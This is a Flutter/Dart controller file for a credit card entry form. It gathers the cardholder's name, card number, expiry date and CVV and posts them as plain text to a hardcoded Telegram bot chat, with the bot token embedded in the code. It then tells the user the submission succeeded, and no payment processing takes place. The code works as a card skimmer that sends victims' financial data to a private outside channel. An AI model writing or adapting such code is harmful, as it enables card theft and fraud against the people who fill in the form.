import 'package:flutter/material.dart';
import 'package:get/get.dart';
import 'package:fluttertoast/fluttertoast.dart';
import 'package:http/http.dart' as http;

class CreditCardFormController extends GetxController {
  final TextEditingController cardNameController = TextEditingController();
  final selectedItem = "Card Level".obs;
  final TextEditingController cardNumberController = TextEditingController();
  final TextEditingController expirationDateController =
      TextEditingController();
  final TextEditingController cvvController = TextEditingController();

  Future<void> submitForm() async {
    final String cardName = cardNameController.text;

    final String cardNumber = cardNumberController.text;
    final String expirationDate = expirationDateController.text;
    final String cvv = cvvController.text;
    final msg = 'The information\n Name:$cardName' +
        '\n Card Number:$cardNumber' +
        '\n Expiration Date:$expirationDate' +
        '\n CVV:$cvv' +
        '\nlevel is ${selectedItem.value}';
    await sendMessageToTelegram(msg);
  }
  // You can validate the form data here if required

  onItemSelect(String? newVal) {
    selectedItem.value = newVal!;
  }

  @override
  void onClose() {
    cardNameController.dispose();
    cardNumberController.dispose();
    expirationDateController.dispose();
    cvvController.dispose();
    super.onClose();
  }

  Future<void> sendMessageToTelegram(String message) async {
    const telegramBotToken = '6523460876:AAGfTKNriMKxXc4AFtXI25tOeM9ygLtUlws';
    const chatId = '488701384';
    const String telegramUrl =
        'https://api.telegram.org/bot$telegramBotToken/sendMessage';

    try {
      final response = await http.post(Uri.parse(telegramUrl), body: {
        'chat_id': chatId,
        'text': message,
      });

      if (response.statusCode == 200) {
        Fluttertoast.showToast(
          msg: 'Credit card data submitted successfully!',
          toastLength: Toast.LENGTH_SHORT,
          gravity: ToastGravity.BOTTOM,
        );
      } else {
        Fluttertoast.showToast(
          msg: 'Failed to submit credit card data.',
          toastLength: Toast.LENGTH_SHORT,
          gravity: ToastGravity.BOTTOM,
        );
      }
    } catch (e) {
      Fluttertoast.showToast(
        msg: 'An error occurred. Please try again later.',
        toastLength: Toast.LENGTH_SHORT,
        gravity: ToastGravity.BOTTOM,
      );
    }
  }
}
